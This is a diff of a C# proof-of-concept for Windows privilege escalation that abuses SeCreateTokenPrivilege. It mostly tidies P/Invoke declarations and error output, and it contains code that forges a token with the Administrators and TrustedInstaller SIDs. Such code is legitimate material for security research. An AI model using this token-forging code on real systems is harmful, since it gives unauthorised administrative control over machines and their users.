@@ -69,7 +69,7 @@ namespace SeCreateTokenPrivilegePoC
         }
 
         [StructLayout(LayoutKind.Explicit, Size = 8)]
-        public struct LARGE_INTEGER
+        struct LARGE_INTEGER
         {
             [FieldOffset(0)]
             public int Low;
@@ -128,7 +128,7 @@ namespace SeCreateTokenPrivilegePoC
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct OBJECT_ATTRIBUTES : IDisposable
+        struct OBJECT_ATTRIBUTES : IDisposable
         {
             public int Length;
             public IntPtr RootDirectory;
@@ -211,7 +211,7 @@ namespace SeCreateTokenPrivilegePoC
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct SID_AND_ATTRIBUTES
+        struct SID_AND_ATTRIBUTES
         {
             public IntPtr Sid; // PSID
             public uint Attributes;
@@ -284,13 +284,14 @@ namespace SeCreateTokenPrivilegePoC
             public LUID SourceIdentifier;
         }
 
+        [StructLayout(LayoutKind.Sequential)]
         struct TOKEN_USER
         {
             public SID_AND_ATTRIBUTES User;
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct UNICODE_STRING : IDisposable
+        struct UNICODE_STRING : IDisposable
         {
             public ushort Length;
             public ushort MaximumLength;
@@ -315,28 +316,17 @@ namespace SeCreateTokenPrivilegePoC
             }
         }
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool AllocateAndInitializeSid(
-            ref SID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
-            byte nSubAuthorityCount,
-            uint dwSubAuthority0,
-            uint dwSubAuthority1,
-            uint dwSubAuthority2,
-            uint dwSubAuthority3,
-            uint dwSubAuthority4,
-            uint dwSubAuthority5,
-            uint dwSubAuthority6,
-            uint dwSubAuthority7,
-            out IntPtr pSid);
-
+        /*
+         * advapi32.dll
+         */
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool AllocateLocallyUniqueId(out LUID Luid);
 
         [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);
 
-        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-        static extern bool ConvertStringSidToSidA(string StringSid, out IntPtr pSid);
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool GetTokenInformation(
@@ -365,11 +355,11 @@ namespace SeCreateTokenPrivilegePoC
             string lpName,
             ref LUID lpLuid);
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool OpenProcessToken(
-            IntPtr ProcessHandle,
-            uint DesiredAccess,
-            out IntPtr TokenHandle);
+        /*
+         * kenel32.dll
+         */
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hModule);
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         static extern uint FormatMessage(
@@ -387,9 +377,9 @@ namespace SeCreateTokenPrivilegePoC
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         static extern IntPtr LoadLibrary(string lpFileName);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool CloseHandle(IntPtr hObject);
-
+        /*
+         * ntdll.dll
+         */
         [DllImport("ntdll.dll")]
         static extern void RtlGetNtVersionNumbers(
             ref int MajorVersion,
@@ -493,7 +483,7 @@ namespace SeCreateTokenPrivilegePoC
             if (!AllocateLocallyUniqueId(out LUID luid))
             {
                 Console.WriteLine("[-] Failed to allocate LUID.");
-                Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                 return IntPtr.Zero;
             }
 
@@ -504,19 +494,19 @@ namespace SeCreateTokenPrivilegePoC
             if (!GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges))
                 return IntPtr.Zero;
 
-            if (!ConvertStringSidToSidA(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
+            if (!ConvertStringSidToSid(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
             {
                 Console.WriteLine("[-] Failed to get Administrator group SID.");
-                Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                 return IntPtr.Zero;
             }
 
-            if (!ConvertStringSidToSidA(
+            if (!ConvertStringSidToSid(
                 "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464",
                 out IntPtr pTrustedInstaller))
             {
                 Console.WriteLine("[-] Failed to get Trusted Installer SID.");
-                Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                 return IntPtr.Zero;
             }
 
@@ -614,7 +604,7 @@ namespace SeCreateTokenPrivilegePoC
             if (ntstatus != STATUS_SUCCESS)
             {
                 Console.WriteLine("[-] Failed to create privileged token.");
-                Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(ntstatus));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus));
                 return IntPtr.Zero;
             }
 
@@ -643,7 +633,7 @@ namespace SeCreateTokenPrivilegePoC
                 if (!LookupPrivilegeValue(IntPtr.Zero, privs[idx], ref luid))
                 {
                     Console.WriteLine("[-] Failed to lookup {0}.");
-                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                     return false;
                 }
 
